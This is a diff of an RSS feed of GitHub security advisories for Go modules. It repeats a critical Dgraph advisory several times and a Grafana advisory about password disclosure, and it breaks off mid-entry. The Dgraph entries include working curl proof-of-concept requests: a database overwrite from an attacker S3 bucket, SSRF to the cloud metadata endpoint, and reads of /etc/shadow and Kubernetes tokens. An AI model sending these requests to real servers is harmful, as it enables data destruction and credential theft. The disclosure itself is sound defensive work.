@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-04-02T20:07:38.099Z</updated>
+    <updated>2026-04-02T21:08:03.384Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,438 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/dgraph-io/dgraph] Dgraph: Pre-Auth Database Overwrite + SSRF + File Read via restoreTenant Missing Authorization]]></title>
+        <id>https://github.com/advisories/GHSA-p5rh-vmhp-gvcw</id>
+        <link href="https://github.com/advisories/GHSA-p5rh-vmhp-gvcw"/>
+        <updated>2026-04-02T20:44:38.000Z</updated>
+        <content type="html"><![CDATA[<p>The <code>restoreTenant</code> admin mutation is missing from the authorization middleware config (<code>admin.go:499-522</code>), making it completely unauthenticated. Unlike the similar <code>restore</code> mutation which requires Guardian-of-Galaxy authentication, <code>restoreTenant</code> executes with zero middleware.</p>
+<p>This mutation accepts attacker-controlled backup source URLs (including <code>file://</code> for local filesystem access), S3/MinIO credentials, encryption key file paths, and Vault credential file paths. An unauthenticated attacker can overwrite the entire database, read server-side files, and perform SSRF.</p>
+<h2 id="authentication-bypass">Authentication Bypass</h2>
+<p>Every admin mutation has middleware configured in <code>adminMutationMWConfig</code> (<code>admin.go:499-522</code>) EXCEPT <code>restoreTenant</code>. The <code>restore</code> mutation has <code>gogMutMWs</code> (Guardian of Galaxy auth + IP whitelist + logging). <code>restoreTenant</code> is absent from the map.</p>
+<p>When middleware is looked up at <code>resolve/resolver.go:431</code>, the map returns nil. The <code>Then()</code> method at <code>resolve/middlewares.go:98</code> checks <code>len(mws) == 0</code> and returns the resolver directly, skipping all authentication, authorization, IP whitelisting, and audit logging.</p>
+<h2 id="poc-1-pre-auth-database-overwrite">PoC 1: Pre-Auth Database Overwrite</h2>
+<p>The attacker hosts a crafted Dgraph backup on their own S3 bucket, then triggers a restore that overwrites the target namespace's entire database:</p>
+<pre><code># No authentication headers needed. No X-Dgraph-AuthToken, no JWT, no Guardian credentials.
+curl -X POST http://dgraph-alpha:8080/admin \
+  -H "Content-Type: application/json" \
+  -d '{
+    "query": "mutation { restoreTenant(input: { restoreInput: { location: \"s3://attacker-bucket/evil-backup\", accessKey: \"AKIAIOSFODNN7EXAMPLE\", secretKey: \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\", anonymous: false }, fromNamespace: 0 }) { code message } }"
+  }'
+
+# Response: {"data":{"restoreTenant":{"code":"Success","message":"Restore operation started."}}}
+# The server fetches the attacker's backup from S3 and overwrites namespace 0 (root namespace).
+</code></pre>
+<p>The resolver at <code>admin/restore.go:54-74</code> passes <code>location</code>, <code>accessKey</code>, <code>secretKey</code> directly to <code>worker.ProcessRestoreRequest</code>. The worker at <code>online_restore.go:98-106</code> connects to the attacker's S3 bucket and restores the malicious backup, overwriting all data.</p>
+<p>Note: the <code>anonymous: true</code> flag (<code>minioclient.go:108-113</code>) creates an S3 client with NO credentials, allowing the attacker to host the malicious backup on a <strong>public S3 bucket</strong> without providing any AWS keys:</p>
+<pre><code>mutation { restoreTenant(input: {
+  restoreInput: { location: "s3://public-attacker-bucket/evil-backup", anonymous: true },
+  fromNamespace: 0
+}) { code message } }
+</code></pre>
+<h2 id="live-poc-results-dgraph-v24x-docker">Live PoC Results (Dgraph v24.x Docker)</h2>
+<p>Tested against <code>dgraph/dgraph:latest</code> in Docker. Side-by-side comparison:</p>
+<pre><code># restore (HAS middleware) -&gt; BLOCKED
+$ curl ... '{"query": "mutation { restore(...) { code } }"}'
+{"errors":[{"message":"resolving restore failed because unauthorized ip address: 172.25.0.1"}]}
+
+# restoreTenant (MISSING middleware) -&gt; AUTH BYPASSED
+$ curl ... '{"query": "mutation { restoreTenant(...) { code } }"}'
+{"errors":[{"message":"resolving restoreTenant failed because failed to verify backup: No backups with the specified backup ID"}]}
+</code></pre>
+<p>The <code>restore</code> mutation is blocked by the IP whitelist middleware. The <code>restoreTenant</code> mutation bypasses all middleware and reaches the backup verification logic.</p>
+<p>Filesystem enumeration also confirmed with distinct error messages:</p>
+<ul>
+<li><code>/etc/</code> (exists): "No backups with the specified backup ID" (directory scanned)</li>
+<li><code>/nonexistent/</code> (doesn't exist): "The uri path doesn't exists" (path doesn't exist)</li>
+<li><code>/tmp/</code> (exists, empty): "No backups with the specified backup ID" (directory scanned)</li>
+</ul>
+<h2 id="poc-2-local-filesystem-probe-via-file-scheme">PoC 2: Local Filesystem Probe via file:// Scheme</h2>
+<pre><code>curl -X POST http://dgraph-alpha:8080/admin \
+  -H "Content-Type: application/json" \
+  -d '{
+    "query": "mutation { restoreTenant(input: { restoreInput: { location: \"file:///etc/\" }, fromNamespace: 0 }) { code message } }"
+  }'
+
+# Error response reveals whether /etc/ exists and its structure.
+# backup_handler.go:130-132 creates a fileHandler for file:// URIs.
+# fileHandler.ListPaths at line 161-166 walks the local filesystem.
+# fileHandler.Read at line 153 reads files: os.ReadFile(h.JoinPath(path))
+</code></pre>
+<h2 id="poc-3-ssrf-via-s3-endpoint">PoC 3: SSRF via S3 Endpoint</h2>
+<pre><code>curl -X POST http://dgraph-alpha:8080/admin \
+  -H "Content-Type: application/json" \
+  -d '{
+    "query": "mutation { restoreTenant(input: { restoreInput: { location: \"s3://169.254.169.254/latest/meta-data/\" }, fromNamespace: 0 }) { code message } }"
+  }'
+
+# The Minio client at backup_handler.go:257 connects to 169.254.169.254 as an S3 endpoint.
+# Error response may leak cloud metadata information.
+</code></pre>
+<h2 id="poc-4-vault-ssrf--server-file-path-read">PoC 4: Vault SSRF + Server File Path Read</h2>
+<pre><code>curl -X POST http://dgraph-alpha:8080/admin \
+  -H "Content-Type: application/json" \
+  -d '{
+    "query": "mutation { restoreTenant(input: { restoreInput: { location: \"s3://attacker-bucket/backup\", accessKey: \"AKIA...\", secretKey: \"...\", vaultAddr: \"http://internal-service:8080\", vaultRoleIDFile: \"/var/run/secrets/kubernetes.io/serviceaccount/token\", vaultSecretIDFile: \"/etc/passwd\", encryptionKeyFile: \"/etc/shadow\" }, fromNamespace: 0 }) { code message } }"
+  }'
+
+# vaultAddr at online_restore.go:484 triggers SSRF to internal-service:8080
+# vaultRoleIDFile at online_restore.go:478-479 reads the K8s SA token from disk
+# encryptionKeyFile at online_restore.go:475 reads /etc/shadow via BuildEncFlag
+</code></pre>
+<h2 id="fix">Fix</h2>
+<p>Add <code>restoreTenant</code> to <code>adminMutationMWConfig</code>:</p>
+<pre><code>"restoreTenant": gogMutMWs,
+</code></pre>
+<p>Koda Reef</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/dgraph-io/dgraph/security/advisories/GHSA-p5rh-vmhp-gvcw">https://github.com/dgraph-io/dgraph/security/advisories/GHSA-p5rh-vmhp-gvcw</a></li>
+<li><a href="https://github.com/dgraph-io/dgraph/commit/b15c87e9353e36618bf8e0df3bd945c0ce7105ef">https://github.com/dgraph-io/dgraph/commit/b15c87e9353e36618bf8e0df3bd945c0ce7105ef</a></li>
+<li><a href="https://github.com/dgraph-io/dgraph/releases/tag/v25.3.1">https://github.com/dgraph-io/dgraph/releases/tag/v25.3.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-p5rh-vmhp-gvcw">https://github.com/advisories/GHSA-p5rh-vmhp-gvcw</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-p5rh-vmhp-gvcw</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-04-02T20:44:36.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/dgraph-io/dgraph/v24] Dgraph: Pre-Auth Database Overwrite + SSRF + File Read via restoreTenant Missing Authorization]]></title>
+        <id>https://github.com/advisories/GHSA-p5rh-vmhp-gvcw</id>
+        <link href="https://github.com/advisories/GHSA-p5rh-vmhp-gvcw"/>
+        <updated>2026-04-02T20:44:38.000Z</updated>
+        <content type="html"><![CDATA[<p>The <code>restoreTenant</code> admin mutation is missing from the authorization middleware config (<code>admin.go:499-522</code>), making it completely unauthenticated. Unlike the similar <code>restore</code> mutation which requires Guardian-of-Galaxy authentication, <code>restoreTenant</code> executes with zero middleware.</p>
+<p>This mutation accepts attacker-controlled backup source URLs (including <code>file://</code> for local filesystem access), S3/MinIO credentials, encryption key file paths, and Vault credential file paths. An unauthenticated attacker can overwrite the entire database, read server-side files, and perform SSRF.</p>
+<h2 id="authentication-bypass">Authentication Bypass</h2>
+<p>Every admin mutation has middleware configured in <code>adminMutationMWConfig</code> (<code>admin.go:499-522</code>) EXCEPT <code>restoreTenant</code>. The <code>restore</code> mutation has <code>gogMutMWs</code> (Guardian of Galaxy auth + IP whitelist + logging). <code>restoreTenant</code> is absent from the map.</p>
+<p>When middleware is looked up at <code>resolve/resolver.go:431</code>, the map returns nil. The <code>Then()</code> method at <code>resolve/middlewares.go:98</code> checks <code>len(mws) == 0</code> and returns the resolver directly, skipping all authentication, authorization, IP whitelisting, and audit logging.</p>
+<h2 id="poc-1-pre-auth-database-overwrite">PoC 1: Pre-Auth Database Overwrite</h2>
+<p>The attacker hosts a crafted Dgraph backup on their own S3 bucket, then triggers a restore that overwrites the target namespace's entire database:</p>
+<pre><code># No authentication headers needed. No X-Dgraph-AuthToken, no JWT, no Guardian credentials.
+curl -X POST http://dgraph-alpha:8080/admin \
+  -H "Content-Type: application/json" \
+  -d '{
+    "query": "mutation { restoreTenant(input: { restoreInput: { location: \"s3://attacker-bucket/evil-backup\", accessKey: \"AKIAIOSFODNN7EXAMPLE\", secretKey: \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\", anonymous: false }, fromNamespace: 0 }) { code message } }"
+  }'
+
+# Response: {"data":{"restoreTenant":{"code":"Success","message":"Restore operation started."}}}
+# The server fetches the attacker's backup from S3 and overwrites namespace 0 (root namespace).
+</code></pre>
+<p>The resolver at <code>admin/restore.go:54-74</code> passes <code>location</code>, <code>accessKey</code>, <code>secretKey</code> directly to <code>worker.ProcessRestoreRequest</code>. The worker at <code>online_restore.go:98-106</code> connects to the attacker's S3 bucket and restores the malicious backup, overwriting all data.</p>
+<p>Note: the <code>anonymous: true</code> flag (<code>minioclient.go:108-113</code>) creates an S3 client with NO credentials, allowing the attacker to host the malicious backup on a <strong>public S3 bucket</strong> without providing any AWS keys:</p>
+<pre><code>mutation { restoreTenant(input: {
+  restoreInput: { location: "s3://public-attacker-bucket/evil-backup", anonymous: true },
+  fromNamespace: 0
+}) { code message } }
+</code></pre>
+<h2 id="live-poc-results-dgraph-v24x-docker">Live PoC Results (Dgraph v24.x Docker)</h2>
+<p>Tested against <code>dgraph/dgraph:latest</code> in Docker. Side-by-side comparison:</p>
+<pre><code># restore (HAS middleware) -&gt; BLOCKED
+$ curl ... '{"query": "mutation { restore(...) { code } }"}'
+{"errors":[{"message":"resolving restore failed because unauthorized ip address: 172.25.0.1"}]}
+
+# restoreTenant (MISSING middleware) -&gt; AUTH BYPASSED
+$ curl ... '{"query": "mutation { restoreTenant(...) { code } }"}'
+{"errors":[{"message":"resolving restoreTenant failed because failed to verify backup: No backups with the specified backup ID"}]}
+</code></pre>
+<p>The <code>restore</code> mutation is blocked by the IP whitelist middleware. The <code>restoreTenant</code> mutation bypasses all middleware and reaches the backup verification logic.</p>
+<p>Filesystem enumeration also confirmed with distinct error messages:</p>
+<ul>
+<li><code>/etc/</code> (exists): "No backups with the specified backup ID" (directory scanned)</li>
+<li><code>/nonexistent/</code> (doesn't exist): "The uri path doesn't exists" (path doesn't exist)</li>
+<li><code>/tmp/</code> (exists, empty): "No backups with the specified backup ID" (directory scanned)</li>
+</ul>
+<h2 id="poc-2-local-filesystem-probe-via-file-scheme">PoC 2: Local Filesystem Probe via file:// Scheme</h2>
+<pre><code>curl -X POST http://dgraph-alpha:8080/admin \
+  -H "Content-Type: application/json" \
+  -d '{
+    "query": "mutation { restoreTenant(input: { restoreInput: { location: \"file:///etc/\" }, fromNamespace: 0 }) { code message } }"
+  }'
+
+# Error response reveals whether /etc/ exists and its structure.
+# backup_handler.go:130-132 creates a fileHandler for file:// URIs.
+# fileHandler.ListPaths at line 161-166 walks the local filesystem.
+# fileHandler.Read at line 153 reads files: os.ReadFile(h.JoinPath(path))
+</code></pre>
+<h2 id="poc-3-ssrf-via-s3-endpoint">PoC 3: SSRF via S3 Endpoint</h2>
+<pre><code>curl -X POST http://dgraph-alpha:8080/admin \
+  -H "Content-Type: application/json" \
+  -d '{
+    "query": "mutation { restoreTenant(input: { restoreInput: { location: \"s3://169.254.169.254/latest/meta-data/\" }, fromNamespace: 0 }) { code message } }"
+  }'
+
+# The Minio client at backup_handler.go:257 connects to 169.254.169.254 as an S3 endpoint.
+# Error response may leak cloud metadata information.
+</code></pre>
+<h2 id="poc-4-vault-ssrf--server-file-path-read">PoC 4: Vault SSRF + Server File Path Read</h2>
+<pre><code>curl -X POST http://dgraph-alpha:8080/admin \
+  -H "Content-Type: application/json" \
+  -d '{
+    "query": "mutation { restoreTenant(input: { restoreInput: { location: \"s3://attacker-bucket/backup\", accessKey: \"AKIA...\", secretKey: \"...\", vaultAddr: \"http://internal-service:8080\", vaultRoleIDFile: \"/var/run/secrets/kubernetes.io/serviceaccount/token\", vaultSecretIDFile: \"/etc/passwd\", encryptionKeyFile: \"/etc/shadow\" }, fromNamespace: 0 }) { code message } }"
+  }'
+
+# vaultAddr at online_restore.go:484 triggers SSRF to internal-service:8080
+# vaultRoleIDFile at online_restore.go:478-479 reads the K8s SA token from disk
+# encryptionKeyFile at online_restore.go:475 reads /etc/shadow via BuildEncFlag
+</code></pre>
+<h2 id="fix">Fix</h2>
+<p>Add <code>restoreTenant</code> to <code>adminMutationMWConfig</code>:</p>
+<pre><code>"restoreTenant": gogMutMWs,
+</code></pre>
+<p>Koda Reef</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/dgraph-io/dgraph/security/advisories/GHSA-p5rh-vmhp-gvcw">https://github.com/dgraph-io/dgraph/security/advisories/GHSA-p5rh-vmhp-gvcw</a></li>
+<li><a href="https://github.com/dgraph-io/dgraph/commit/b15c87e9353e36618bf8e0df3bd945c0ce7105ef">https://github.com/dgraph-io/dgraph/commit/b15c87e9353e36618bf8e0df3bd945c0ce7105ef</a></li>
+<li><a href="https://github.com/dgraph-io/dgraph/releases/tag/v25.3.1">https://github.com/dgraph-io/dgraph/releases/tag/v25.3.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-p5rh-vmhp-gvcw">https://github.com/advisories/GHSA-p5rh-vmhp-gvcw</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-p5rh-vmhp-gvcw</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-04-02T20:44:36.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/dgraph-io/dgraph/v25] Dgraph: Pre-Auth Database Overwrite + SSRF + File Read via restoreTenant Missing Authorization]]></title>
+        <id>https://github.com/advisories/GHSA-p5rh-vmhp-gvcw</id>
+        <link href="https://github.com/advisories/GHSA-p5rh-vmhp-gvcw"/>
+        <updated>2026-04-02T20:44:38.000Z</updated>
+        <content type="html"><![CDATA[<p>The <code>restoreTenant</code> admin mutation is missing from the authorization middleware config (<code>admin.go:499-522</code>), making it completely unauthenticated. Unlike the similar <code>restore</code> mutation which requires Guardian-of-Galaxy authentication, <code>restoreTenant</code> executes with zero middleware.</p>
+<p>This mutation accepts attacker-controlled backup source URLs (including <code>file://</code> for local filesystem access), S3/MinIO credentials, encryption key file paths, and Vault credential file paths. An unauthenticated attacker can overwrite the entire database, read server-side files, and perform SSRF.</p>
+<h2 id="authentication-bypass">Authentication Bypass</h2>
+<p>Every admin mutation has middleware configured in <code>adminMutationMWConfig</code> (<code>admin.go:499-522</code>) EXCEPT <code>restoreTenant</code>. The <code>restore</code> mutation has <code>gogMutMWs</code> (Guardian of Galaxy auth + IP whitelist + logging). <code>restoreTenant</code> is absent from the map.</p>
+<p>When middleware is looked up at <code>resolve/resolver.go:431</code>, the map returns nil. The <code>Then()</code> method at <code>resolve/middlewares.go:98</code> checks <code>len(mws) == 0</code> and returns the resolver directly, skipping all authentication, authorization, IP whitelisting, and audit logging.</p>
+<h2 id="poc-1-pre-auth-database-overwrite">PoC 1: Pre-Auth Database Overwrite</h2>
+<p>The attacker hosts a crafted Dgraph backup on their own S3 bucket, then triggers a restore that overwrites the target namespace's entire database:</p>
+<pre><code># No authentication headers needed. No X-Dgraph-AuthToken, no JWT, no Guardian credentials.
+curl -X POST http://dgraph-alpha:8080/admin \
+  -H "Content-Type: application/json" \
+  -d '{
+    "query": "mutation { restoreTenant(input: { restoreInput: { location: \"s3://attacker-bucket/evil-backup\", accessKey: \"AKIAIOSFODNN7EXAMPLE\", secretKey: \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\", anonymous: false }, fromNamespace: 0 }) { code message } }"
+  }'
+
+# Response: {"data":{"restoreTenant":{"code":"Success","message":"Restore operation started."}}}
+# The server fetches the attacker's backup from S3 and overwrites namespace 0 (root namespace).
+</code></pre>
+<p>The resolver at <code>admin/restore.go:54-74</code> passes <code>location</code>, <code>accessKey</code>, <code>secretKey</code> directly to <code>worker.ProcessRestoreRequest</code>. The worker at <code>online_restore.go:98-106</code> connects to the attacker's S3 bucket and restores the malicious backup, overwriting all data.</p>
+<p>Note: the <code>anonymous: true</code> flag (<code>minioclient.go:108-113</code>) creates an S3 client with NO credentials, allowing the attacker to host the malicious backup on a <strong>public S3 bucket</strong> without providing any AWS keys:</p>
+<pre><code>mutation { restoreTenant(input: {
+  restoreInput: { location: "s3://public-attacker-bucket/evil-backup", anonymous: true },
+  fromNamespace: 0
+}) { code message } }
+</code></pre>
+<h2 id="live-poc-results-dgraph-v24x-docker">Live PoC Results (Dgraph v24.x Docker)</h2>
+<p>Tested against <code>dgraph/dgraph:latest</code> in Docker. Side-by-side comparison:</p>
+<pre><code># restore (HAS middleware) -&gt; BLOCKED
+$ curl ... '{"query": "mutation { restore(...) { code } }"}'
+{"errors":[{"message":"resolving restore failed because unauthorized ip address: 172.25.0.1"}]}
+
+# restoreTenant (MISSING middleware) -&gt; AUTH BYPASSED
+$ curl ... '{"query": "mutation { restoreTenant(...) { code } }"}'
+{"errors":[{"message":"resolving restoreTenant failed because failed to verify backup: No backups with the specified backup ID"}]}
+</code></pre>
+<p>The <code>restore</code> mutation is blocked by the IP whitelist middleware. The <code>restoreTenant</code> mutation bypasses all middleware and reaches the backup verification logic.</p>
+<p>Filesystem enumeration also confirmed with distinct error messages:</p>
+<ul>
+<li><code>/etc/</code> (exists): "No backups with the specified backup ID" (directory scanned)</li>
+<li><code>/nonexistent/</code> (doesn't exist): "The uri path doesn't exists" (path doesn't exist)</li>
+<li><code>/tmp/</code> (exists, empty): "No backups with the specified backup ID" (directory scanned)</li>
+</ul>
+<h2 id="poc-2-local-filesystem-probe-via-file-scheme">PoC 2: Local Filesystem Probe via file:// Scheme</h2>
+<pre><code>curl -X POST http://dgraph-alpha:8080/admin \
+  -H "Content-Type: application/json" \
+  -d '{
+    "query": "mutation { restoreTenant(input: { restoreInput: { location: \"file:///etc/\" }, fromNamespace: 0 }) { code message } }"
+  }'
+
+# Error response reveals whether /etc/ exists and its structure.
+# backup_handler.go:130-132 creates a fileHandler for file:// URIs.
+# fileHandler.ListPaths at line 161-166 walks the local filesystem.
+# fileHandler.Read at line 153 reads files: os.ReadFile(h.JoinPath(path))
+</code></pre>
+<h2 id="poc-3-ssrf-via-s3-endpoint">PoC 3: SSRF via S3 Endpoint</h2>
+<pre><code>curl -X POST http://dgraph-alpha:8080/admin \
+  -H "Content-Type: application/json" \
+  -d '{
+    "query": "mutation { restoreTenant(input: { restoreInput: { location: \"s3://169.254.169.254/latest/meta-data/\" }, fromNamespace: 0 }) { code message } }"
+  }'
+
+# The Minio client at backup_handler.go:257 connects to 169.254.169.254 as an S3 endpoint.
+# Error response may leak cloud metadata information.
+</code></pre>
+<h2 id="poc-4-vault-ssrf--server-file-path-read">PoC 4: Vault SSRF + Server File Path Read</h2>
+<pre><code>curl -X POST http://dgraph-alpha:8080/admin \
+  -H "Content-Type: application/json" \
+  -d '{
+    "query": "mutation { restoreTenant(input: { restoreInput: { location: \"s3://attacker-bucket/backup\", accessKey: \"AKIA...\", secretKey: \"...\", vaultAddr: \"http://internal-service:8080\", vaultRoleIDFile: \"/var/run/secrets/kubernetes.io/serviceaccount/token\", vaultSecretIDFile: \"/etc/passwd\", encryptionKeyFile: \"/etc/shadow\" }, fromNamespace: 0 }) { code message } }"
+  }'
+
+# vaultAddr at online_restore.go:484 triggers SSRF to internal-service:8080
+# vaultRoleIDFile at online_restore.go:478-479 reads the K8s SA token from disk
+# encryptionKeyFile at online_restore.go:475 reads /etc/shadow via BuildEncFlag
+</code></pre>
+<h2 id="fix">Fix</h2>
+<p>Add <code>restoreTenant</code> to <code>adminMutationMWConfig</code>:</p>
+<pre><code>"restoreTenant": gogMutMWs,
+</code></pre>
+<p>Koda Reef</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/dgraph-io/dgraph/security/advisories/GHSA-p5rh-vmhp-gvcw">https://github.com/dgraph-io/dgraph/security/advisories/GHSA-p5rh-vmhp-gvcw</a></li>
+<li><a href="https://github.com/dgraph-io/dgraph/commit/b15c87e9353e36618bf8e0df3bd945c0ce7105ef">https://github.com/dgraph-io/dgraph/commit/b15c87e9353e36618bf8e0df3bd945c0ce7105ef</a></li>
+<li><a href="https://github.com/dgraph-io/dgraph/releases/tag/v25.3.1">https://github.com/dgraph-io/dgraph/releases/tag/v25.3.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-p5rh-vmhp-gvcw">https://github.com/advisories/GHSA-p5rh-vmhp-gvcw</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-p5rh-vmhp-gvcw</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-04-02T20:44:36.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana public dashboards disclose all direct mode datasources]]></title>
+        <id>https://github.com/advisories/GHSA-3q27-7qjq-p9c5</id>
+        <link href="https://github.com/advisories/GHSA-3q27-7qjq-p9c5"/>
+        <updated>2026-04-02T20:43:51.000Z</updated>
+        <content type="html"><![CDATA[<p>When using public dashboards and direct data-sources, all direct data-sources' passwords are exposed despite not being used in dashboards.</p>
+<p>No passwords of proxied data-sources are exposed. We encourage all direct data-sources to be converted to proxied data-sources as far as possible to improve your deployments' security.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27877">https://nvd.nist.gov/vuln/detail/CVE-2026-27877</a></li>
+<li><a href="https://grafana.com/security/security-advisories/cve-2026-27877">https://grafana.com/security/security-advisories/cve-2026-27877</a></li>
+<li><a href="https://github.com/advisories/GHSA-3q27-7qjq-p9c5">https://github.com/advisories/GHSA-3q27-7qjq-p9c5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3q27-7qjq-p9c5</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-03-27T15:30:25.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana public dashboards disclose all direct mode datasources]]></title>
+        <id>https://github.com/advisories/GHSA-3q27-7qjq-p9c5</id>
+        <link href="https://github.com/advisories/GHSA-3q27-7qjq-p9c5"/>
+        <updated>2026-04-02T20:43:51.000Z</updated>
+        <content type="html"><![CDATA[<p>When using public dashboards and direct data-sources, all direct data-sources' passwords are exposed despite not being used in dashboards.</p>
+<p>No passwords of proxied data-sources are exposed. We encourage all direct data-sources to be converted to proxied data-sources as far as possible to improve your deployments' security.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27877">https://nvd.nist.gov/vuln/detail/CVE-2026-27877</a></li>
+<li><a href="https://grafana.com/security/security-advisories/cve-2026-27877">https://grafana.com/security/security-advisories/cve-2026-27877</a></li>
+<li><a href="https://github.com/advisories/GHSA-3q27-7qjq-p9c5">https://github.com/advisories/GHSA-3q27-7qjq-p9c5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3q27-7qjq-p9c5</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-03-27T15:30:25.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana public dashboards disclose all direct mode datasources]]></title>
+        <id>https://github.com/advisories/GHSA-3q27-7qjq-p9c5</id>
+        <link href="https://github.com/advisories/GHSA-3q27-7qjq-p9c5"/>
+        <updated>2026-04-02T20:43:51.000Z</updated>
+        <content type="html"><![CDATA[<p>When using public dashboards and direct data-sources, all direct data-sources' passwords are exposed despite not being used in dashboards.</p>
+<p>No passwords of proxied data-sources are exposed. We encourage all direct data-sources to be converted to proxied data-sources as far as possible to improve your deployments' security.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27877">https://nvd.nist.gov/vuln/detail/CVE-2026-27877</a></li>
+<li><a href="https://grafana.com/security/security-advisories/cve-2026-27877">https://grafana.com/security/security-advisories/cve-2026-27877</a></li>
+<li><a href="https://github.com/advisories/GHSA-3q27-7qjq-p9c5">https://github.com/advisories/GHSA-3q27-7qjq-p9c5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3q27-7qjq-p9c5</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-03-27T15:30:25.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana public dashboards disclose all direct mode datasources]]></title>
+        <id>https://github.com/advisories/GHSA-3q27-7qjq-p9c5</id>
+        <link href="https://github.com/advisories/GHSA-3q27-7qjq-p9c5"/>
+        <updated>2026-04-02T20:43:51.000Z</updated>
+        <content type="html"><![CDATA[<p>When using public dashboards and direct data-sources, all direct data-sources' passwords are exposed despite not being used in dashboards.</p>
+<p>No passwords of proxied data-sources are exposed. We encourage all direct data-sources to be converted to proxied data-sources as far as possible to improve your deployments' security.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27877">https://nvd.nist.gov/vuln/detail/CVE-2026-27877</a></li>
+<li><a href="https://grafana.com/security/security-advisories/cve-2026-27877">https://grafana.com/security/security-advisories/cve-2026-27877</a></li>
+<li><a href="https://github.com/advisories/GHSA-3q27-7qjq-p9c5">https://github.com/advisories/GHSA-3q27-7qjq-p9c5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3q27-7qjq-p9c5</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-03-27T15:30:25.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana public dashboards disclose all direct mode datasources]]></title>
+        <id>https://github.com/advisories/GHSA-3q27-7qjq-p9c5</id>
+        <link href="https://github.com/advisories/GHSA-3q27-7qjq-p9c5"/>
+        <updated>2026-04-02T20:43:51.000Z</updated>
+        <content type="html"><![CDATA[<p>When using public dashboards and direct data-sources, all direct data-sources' passwords are exposed despite not being used in dashboards.</p>
+<p>No passwords of proxied data-sources are exposed. We encourage all direct data-sources to be converted to proxied data-sources as far as possible to improve your deployments' security.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27877">https://nvd.nist.gov/vuln/detail/CVE-2026-27877</a></li>
+<li><a href="https://grafana.com/security/security-advisories/cve-2026-27877">https://grafana.com/security/security-advisories/cve-2026-27877</a></li>
+<li><a href="https://github.com/advisories/GHSA-3q27-7qjq-p9c5">https://github.com/advisories/GHSA-3q27-7qjq-p9c5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3q27-7qjq-p9c5</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-03-27T15:30:25.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana public dashboards disclose all direct mode datasources]]></title>
+        <id>https://github.com/advisories/GHSA-3q27-7qjq-p9c5</id>
+        <link href="https://github.com/advisories/GHSA-3q27-7qjq-p9c5"/>
+        <updated>2026-04-02T20:43:51.000Z</updated>
+        <content type="html"><![CDATA[<p>When using public dashboards and direct data-sources, all direct data-sources' passwords are exposed despite not being used in dashboards.</p>
